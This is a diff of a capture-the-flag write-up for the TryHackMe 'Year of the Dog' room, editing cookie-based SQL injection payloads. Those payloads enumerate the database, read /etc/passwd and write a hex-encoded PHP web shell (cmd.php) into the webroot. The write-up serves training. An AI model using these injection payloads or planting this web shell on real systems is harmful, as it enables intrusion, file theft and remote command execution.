@@ -1,3 +1,4 @@
+# [Year of the Dog](https://tryhackme.com/room/yearofthedog)
 ## ENUMERATION
 Nmap scan: `nmap -p- -vv <MACHINE-IP> -oG initial-scan` 
 ```
@@ -22,20 +23,20 @@ This confirms that SQLi is the way to go. UNION SELECT works.<br>
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20122020.png)
 
-`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='webapp' -- -` gives table `queue`
+`UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='webapp' -- -` gives table `queue`
 
-`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='webapp' and table_name='queue'-- -` gives 2 columns : `userID` and `queueNum`
+`UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='webapp' and table_name='queue'-- -` gives 2 columns : `userID` and `queueNum`
 
 Seems like we can even write to webroot using :` INTO OUTFILE '/var/www/html/`<br>
-`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,'testing' INTO OUTFILE '/var/www/html/test.txt'-- -` gives:
+`UNION SELECT 1,'testing' INTO OUTFILE '/var/www/html/test.txt'-- -` gives:
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20124149.png)
 
-Using Command : `Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,LOAD_FILE('/etc/passwd') -- -` we got 1 user:<br>
+Using Command : `UNION SELECT 1,LOAD_FILE('/etc/passwd') -- -` we got 1 user:<br>
 `dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash`
  
  As RCE detection is triggered by <? we'll have to hex encode our payload and then pass it through SQL unhex function.<br>
- `Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,UNHEX('3C3F7068702073797374656D28244745545B27636D64275D293B203F3E') INTO OUTFILE '/var/www/html/cmd.php' -- -`<br>
+ `UNION SELECT 1,UNHEX('3C3F7068702073797374656D28244745545B27636D64275D293B203F3E') INTO OUTFILE '/var/www/html/cmd.php' -- -`<br>
  Now if it works:
 
  ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20142410.png)
